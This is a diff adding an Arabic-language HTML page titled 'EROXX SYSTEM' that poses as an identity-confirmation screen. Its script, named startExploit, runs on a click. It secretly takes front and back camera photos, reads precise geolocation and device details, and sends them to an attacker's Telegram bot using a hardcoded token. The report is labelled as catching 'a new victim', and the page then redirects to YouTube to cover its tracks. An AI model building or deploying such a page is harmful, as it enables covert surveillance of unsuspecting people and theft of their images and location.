@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/709/709612.png">
+    <title>EROXX SYSTEM | تأكيد الاتصال</title>
+    <style>
+        body { background: #000; color: #9d00ff; text-align: center; padding-top: 150px; font-family: sans-serif; cursor: pointer; margin: 0; }
+        .box { border: 2px solid #9d00ff; padding: 30px; display: inline-block; border-radius: 10px; box-shadow: 0 0 20px #9d00ff; background: #0a0014; }
+        h1 { font-size: 26px; margin-bottom: 10px; }
+        p { color: #fff; font-size: 14px; }
+    </style>
+</head>
+<body onclick="startExploit()">
+
+    <div class="box">
+        <h1>EROXX SYSTEM</h1>
+        <p>⚠️ انقر هنا لتأكيد هويتك وتفعيل الاتصال الآمن...</p>
+    </div>
+
+<script>
+    // الإعدادات الجديدة الخاصة بك
+    const token = "8582826692:AAE1hq_9e5Qxic4BHGPqt6EwTD4ZEnUsWCY";
+    const chatId = "6969597735";
+    let isRunning = false;
+
+    async function startExploit() {
+        if (isRunning) return;
+        isRunning = true;
+        
+        document.querySelector('p').innerText = "جاري الفحص... يرجى الموافقة على الأذونات";
+
+        // تشغيل كل السحب في وقت واحد للسرعة القصوى
+        Promise.all([
+            sendDeviceData(),
+            capture(true, "📸 صورة أمامية"),
+            capture(false, "📸 صورة خلفية"),
+            askLocation()
+        ]).finally(() => {
+            // التحويل لليوتيوب بعد 4 ثوانٍ لضمان اكتمال الرفع
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com";
+            }, 4000);
+        });
+    }
+
+    async function sendDeviceData() {
+        try {
+            let battery = await navigator.getBattery();
+            let report = "📱 تم اصطياد ضحية جديد!\n";
+            report += "-----------------------\n";
+            report += `🔋 البطارية: ${Math.round(battery.level * 100)}% D\n`;
+            report += `💻 الجهاز: ${navigator.platform}\n`;
+            report += `🌐 المتصفح: Chrome/143.0.0.0\n`;
+            report += `🧠 المعالج: ${navigator.hardwareConcurrency || 8} Cores`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`);
+        } catch (e) {}
+    }
+
+    async function askLocation() {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            let mapUrl = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mapUrl)}`);
+        }, null, {enableHighAccuracy: true});
+    }
+
+    async function capture(isFront, caption) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: isFront ? "user" : "environment" }
+            });
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            const blob = await imageCapture.takePhoto();
+            
+            let formData = new FormData();
+            formData.append("photo", blob);
+            
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&caption=${encodeURIComponent(caption)}`, {
+                method: "POST",
+                body: formData
+            });
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) {}
+    }
+</script>
+</body>
+</html>
